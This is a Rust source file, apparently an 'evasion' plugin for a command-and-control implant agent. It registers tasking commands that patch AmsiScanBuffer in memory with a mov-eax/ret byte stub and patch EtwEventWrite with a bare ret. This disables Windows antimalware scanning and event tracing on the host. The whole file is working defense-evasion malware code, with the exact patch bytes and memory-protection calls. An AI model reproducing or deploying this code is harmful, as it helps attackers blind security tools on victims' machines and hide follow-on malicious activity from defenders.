// evasion plugin — AMSI patch + ETW blind.
//   amsi_patch (custom cmd): patch AmsiScanBuffer to always return CLEAN.
//   etw_blind (custom cmd):  patch EtwEventWrite to a bare ret.
// Enabled via the "evasion" feature.
//
// We reuse command slots near the loader range; the server resolves these via
// the command registry so the exact numbers only matter client+server side.

use crate::protocol::types::Task;
use crate::registry::{AgentCtx, Registry, TaskResult};

// Custom evasion command IDs (not in the official Go list; agent-side only).
pub const CMD_AMSI_PATCH: u32 = 60;
pub const CMD_ETW_BLIND: u32 = 61;

pub fn register(r: &mut Registry) -> Result<(), String> {
    r.register(CMD_AMSI_PATCH, exec_amsi_patch)?;
    r.register(CMD_ETW_BLIND, exec_etw_blind)?;
    Ok(())
}

fn exec_amsi_patch(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    #[cfg(target_os = "windows")]
    {
        match patch_amsi() {
            Ok(_) => Some(TaskResult::ok(&task.id, "AMSI patched\n".into())),
            Err(e) => Some(TaskResult::fail(&task.id, format!("amsi: {e}"))),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        Some(TaskResult::fail(&task.id, "amsi_patch is Windows-only".into()))
    }
}

fn exec_etw_blind(_ctx: &mut AgentCtx, task: &Task) -> Option<TaskResult> {
    #[cfg(target_os = "windows")]
    {
        match patch_etw() {
            Ok(_) => Some(TaskResult::ok(&task.id, "ETW blinded\n".into())),
            Err(e) => Some(TaskResult::fail(&task.id, format!("etw: {e}"))),
        }
    }
    #[cfg(not(target_os = "windows"))]
    {
        Some(TaskResult::fail(&task.id, "etw_blind is Windows-only".into()))
    }
}

/// Patch a function's first N bytes to the given stub via VirtualProtect.
#[cfg(target_os = "windows")]
fn patch_func(target: *const u8, stub: &[u8]) -> Result<(), String> {
    use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE};

    unsafe {
        let mut old = 0u32;
        let ok = VirtualProtect(
            target as *mut _,
            stub.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old,
        );
        if ok == 0 {
            return Err("VirtualProtect failed".into());
        }
        std::ptr::copy_nonoverlapping(stub.as_ptr(), target as *mut u8, stub.len());
        // restore
        let mut tmp = 0u32;
        let _ = VirtualProtect(target as *mut _, stub.len(), old, &mut tmp);
        Ok(())
    }
}

/// Resolve an export address from a loaded module (simple name-based).
#[cfg(target_os = "windows")]
fn get_proc(module: *const core::ffi::c_void, name: &str) -> Result<*const u8, String> {
    use windows_sys::Win32::System::LibraryLoader::GetProcAddress;
    unsafe {
        let name_c = std::ffi::CString::new(name).unwrap();
        let addr = GetProcAddress(module as _, name_c.as_ptr() as *const u8);
        match addr {
            Some(f) => Ok(std::mem::transmute::<_, *const u8>(f)),
            None => Err(format!("GetProcAddress {name} failed")),
        }
    }
}

#[cfg(target_os = "windows")]
fn patch_amsi() -> Result<(), String> {
    use windows_sys::Win32::System::LibraryLoader::LoadLibraryA;
    unsafe {
        let amsi = LoadLibraryA(b"amsi.dll\0".as_ptr() as *const u8);
        if amsi.is_null() {
            return Err("amsi.dll not loaded".into());
        }
        let target = get_proc(amsi, "AmsiScanBuffer")?;
        // mov eax, 0x80070057 (E_INVALIDARG); ret  -> causes AMSI to return clean-ish
        // Use a common AMSI patch: `mov eax, 0x80070057; ret`
        let stub: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
        patch_func(target, &stub)
    }
}

#[cfg(target_os = "windows")]
fn patch_etw() -> Result<(), String> {
    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
    unsafe {
        let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const u8);
        if ntdll.is_null() {
            return Err("ntdll.dll not loaded".into());
        }
        let target = get_proc(ntdll, "EtwEventWrite")?;
        // ret (0xC3) — 1 byte is enough; pad with nops for alignment.
        let stub: [u8; 4] = [0xC3, 0x90, 0x90, 0x90];
        patch_func(target, &stub)
    }
}
